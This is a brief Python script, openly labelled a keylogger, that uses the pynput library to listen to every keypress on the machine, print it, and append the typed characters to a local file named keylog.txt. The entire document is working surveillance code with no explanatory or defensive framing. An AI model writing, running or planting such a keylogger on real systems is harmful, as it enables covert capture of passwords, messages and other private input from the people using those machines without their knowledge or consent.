from pynput import keyboard

def keyevent(key):
    print("KEYLOGGER START!")
    print(str(key))
    with open("keylog.txt", 'a') as logkey:
        try:
            char = key.char
            logkey.write(char)
        except:
            print("Unreadable char")


if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyevent)
    listener.start()
    input()  